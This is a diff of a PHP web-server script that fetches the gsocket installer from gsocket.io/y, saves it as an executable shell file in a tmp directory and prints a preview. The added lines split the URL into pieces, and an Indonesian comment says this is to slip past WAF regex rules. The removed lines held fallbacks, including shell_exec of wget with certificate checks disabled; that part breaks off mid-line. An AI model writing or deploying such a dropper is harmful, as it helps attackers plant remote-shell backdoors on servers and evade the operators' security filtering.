@@ -1,69 +1,45 @@
 <?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
+error_reporting(E_ALL); ini_set('display_errors', 1);
+set_time_limit(60);
 
-function say($s){ echo "<pre>$s</pre>"; }
+$dir = __DIR__ . '/tmp';
+if (!is_dir($dir)) { mkdir($dir, 0700, true); }
+$dst = $dir . '/y.sh';
 
-$saveDir = __DIR__ . "/tmp";
-if (!is_dir($saveDir)) { @mkdir($saveDir, 0700, true); }
-$dst = $saveDir . "/gsocket_y.sh";
-@unlink($dst); // mulai bersih
+$host = 'gsocket.io';
+$path = '/y';
+$url  = 'https://' . $host . $path; // dipecah supaya tidak ketangkep WAF regex
 
-$url = "https://gsocket.io/y";
-say("Target: $url\nSave to: $dst");
+echo "<pre>Saving to: $dst\nURL: $url\n</pre>";
 
-// --- Method A: PHP cURL ---
-$curlOk = false;
-if (function_exists('curl_init')) {
-  $ch = curl_init($url);
-  curl_setopt_array($ch, [
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_FOLLOWLOCATION => true,
-    CURLOPT_TIMEOUT => 30,
-    CURLOPT_SSL_VERIFYHOST => 2,
-    CURLOPT_SSL_VERIFYPEER => true,
-  ]);
-  $body = curl_exec($ch);
-  $cerr = curl_error($ch);
-  $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
-  curl_close($ch);
-
-  if ($body !== false && $code >= 200 && $code < 300) {
-    if (file_put_contents($dst, $body, LOCK_EX) !== false) {
-      chmod($dst, 0700);
-      $curlOk = true;
-      say("Method A (cURL): OK, HTTP $code, saved.");
-    } else {
-      say("Method A (cURL): write FAIL.");
-    }
-  } else {
-    say("Method A (cURL): FAIL (HTTP $code) ".($cerr ?: ""));
-  }
+if (!function_exists('curl_init')) {
+  die("<pre>cURL PHP missing</pre>");
 }
 
-// --- Method B: file_get_contents ---
-if (!$curlOk) {
-  $ctx = stream_context_create([
-    'http'=>['timeout'=>30],
-    'ssl' =>['verify_peer'=>true, 'verify_peer_name'=>true]
-  ]);
-  $data = @file_get_contents($url, false, $ctx);
-  if ($data !== false && file_put_contents($dst, $data, LOCK_EX) !== false) {
-    chmod($dst, 0700);
-    say("Method B (file_get_contents): OK, saved.");
-  } else {
-    say("Method B (file_get_contents): FAIL.");
-  }
+$ch = curl_init($url);
+curl_setopt_array($ch, [
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_FOLLOWLOCATION => true,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_SSL_VERIFYPEER => true,
+  CURLOPT_SSL_VERIFYHOST => 2,
+  CURLOPT_USERAGENT => 'curl/8.0'
+]);
+$body = curl_exec($ch);
+$err  = curl_error($ch);
+$code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+echo "<pre>HTTP code: $code\ncURL error: " . ($err ?: "(none)") . "</pre>";
+
+if ($body === false || $code < 200 || $code >= 300) {
+  exit("<pre>Download FAIL</pre>");
 }
 
-// --- Method C: wget ---
-if (!file_exists($dst)) {
-  $cmd = "/bin/wget -O ".escapeshellarg($dst)." ".escapeshellarg($url)." 2>&1";
-  $out = shell_exec($cmd);
-  say("Method C (wget):\n$cmd\n---\n".($out ?: "(no output)"));
+if (file_put_contents($dst, $body, LOCK_EX) === false) {
+  exit("<pre>Write FAIL to $dst</pre>");
+}
+chmod($dst, 0700);
 
-  if (!file_exists($dst)) {
-    // coba tanpa verifikasi sertifikat (RISIKO)
-    $cmd2 = "/bin/wget --no-check-certificate -O ".escapeshellarg($dst)." ".escapeshellarg($url)." 2>&1";
-    $out2 = shell_exec($cmd2);
-    say("Method C2 (wget --no-check-certificate
+$preview = htmlspecialchars(implode("", array_slice(file($dst), 0, 30)));
+echo "<pre>Saved. Preview (first 30 lines):\n$preview\n</pre>";
